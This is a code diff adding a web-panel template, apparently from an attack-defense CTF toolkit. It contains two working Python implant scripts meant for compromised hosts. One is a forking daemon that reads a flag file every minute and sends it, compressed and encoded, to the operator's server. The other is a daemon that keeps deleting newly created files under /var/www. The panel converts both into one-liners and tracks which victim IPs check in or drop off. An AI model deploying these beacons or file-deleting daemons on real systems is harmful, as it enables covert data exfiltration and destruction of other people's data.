@@ -1,0 +1,171 @@
+<div class="am-form" id ="pony-box">
+    <ul class="am-avg-sm-7 am-thumbnails pony-box">
+        <li v-for="item in recent">
+            <div>
+                {{ item.ip }}<br>
+                {{ item.key }}<br>
+                {{ item.tip }}
+            </div>
+        </li>
+    </ul>
+
+    <div class="am-form-group">
+        <label for="pc_src">定时心跳+回报flag脚本</label>
+        <textarea id="pc_src" debounce="500" v-model="source" rows="7">
+
+import zlib, time, urllib2, base64
+
+a = 'http://10.0.0.2:8080/ichuqiu.flag'
+b = 'http://${config.SPEC['SERV_HOST']}:${config.PORT}/k?c='
+
+def f():
+    try:return urllib2.urlopen(a).read()
+    except:pass
+
+def s(i):
+    try: return urllib2.urlopen(b+base64.b64encode(zlib.compress(i)))
+    except:pass
+
+import os
+
+pid = int(os.getpid())
+
+def _do_wtf():
+    r = f()
+    if r: s(r)
+    time.sleep(60)
+
+def daemon():
+    pid = os.fork()
+    if pid != 0: os._exit(0)
+    while 1: _do_wtf()
+
+daemon()</textarea>
+    </div>
+
+    <div class="am-form-group">
+        <label for="pc_src">一句话：定时心跳+回报flag脚本</label>
+        <textarea id="pc_src" debounce="500" rows="3">{{ one_line }}</textarea>
+    </div>
+
+    <div class="am-form-group">
+        <label for="pc_src">自动删文件（daemon版本）</label>
+        <textarea id="pc_src" debounce="500" v-model="source2" rows="7">
+# coding:utf-8
+
+import os
+import time
+from os.path import join
+
+BC =  time.time()
+WN = ['infoconfig.php', 'Template.class.php']
+
+def arm(d):
+    for i in os.listdir(d):
+        fn = join(d, i)
+        stat = os.stat(fn)
+
+        if os.path.isdir(fn):
+            arm(fn)
+        else:
+            if BC and stat.st_ctime > BC:
+                 if not i in WN:
+                     os.remove(fn)
+
+
+pid = int(os.getpid())
+
+def _do_wtf():
+    arm("/var/www")
+    time.sleep(1)
+
+def daemon():
+    pid = os.fork()
+    if pid != 0:
+        os._exit(0)
+        return
+    while 1: _do_wtf()
+
+daemon()</textarea>
+    </div>
+
+    <div class="am-form-group">
+        <label for="pc_src">一句话：自动删文件</label>
+        <textarea id="pc_src" debounce="500" rows="3">{{ one_line2 }}</textarea>
+    </div>
+
+    <div class="am-form-group">
+        <label for="pc_src">新增</label>
+        <textarea id="txt_new" debounce="500" rows="7"></textarea>
+    </div>
+
+    <div class="am-form-group">
+        <label for="pc_src">断开</label>
+        <textarea id="txt_lost" debounce="500" rows="7"></textarea>
+    </div>
+
+    % if False:
+    <div class="am-form-group">
+        <label for="pc_src">源码</label>
+        <textarea id="pc_src" debounce="500" v-model="source" rows="7"></textarea>
+    </div>
+    % endif
+
+</div>
+
+<%block name="script">
+<script>
+    (function() {
+        var the_data = {};
+        var recent = [];
+        var lost = [];
+        var _new = [];
+
+        var demo = new Vue({
+            el: '#pony-box',
+            data: {
+                recent: recent,
+                lost: lost,
+                _new: _new,
+                source: the_data.source,
+                one_line: the_data.one_line,
+                source2: the_data.source2,
+                one_line2: the_data.one_line2,
+            },
+            watch: {
+                source: function (val, oldVal) {
+                    self = this;
+                    $.post("${ url_for('j_pycode') }", {txt: val}, function(ret) {
+                        self.pack = ret.pack;
+                        self.one_line = ret.one_line;
+                    });
+                },
+                source2: function (val, oldVal) {
+                    self = this;
+                    $.post("${ url_for('j_pycode') }", {txt: val}, function(ret) {
+                        self.pack2 = ret.pack;
+                        self.one_line2 = ret.one_line;
+                    });
+                },
+            },
+        });
+
+        setInterval(function() {
+            $.get("${ url_for("j_flag_info") }", function(ret) {
+                while (recent.pop()) ;
+                while (lost.pop()) ;
+                while (_new.pop()) ;
+                for (var i in ret.recent) recent.push(ret.recent[i]);
+                for (var i in ret.lost) {
+                    lost.push(ret.lost[i]);
+                    $("#txt_lost").val($("#txt_lost").val() + '\n' + ret.lost[i].key + ' ' + ret.lost[i].ip);
+                }
+                for (var i in ret.new) {
+                    _new.push(ret.new[i]);
+                    $("#txt_new").val($("#txt_new").val() + '\n' + ret.new[i].key + ' ' + ret.new[i].ip);
+                }
+            });
+        }, 3000);
+	})();
+</script>
+</%block>
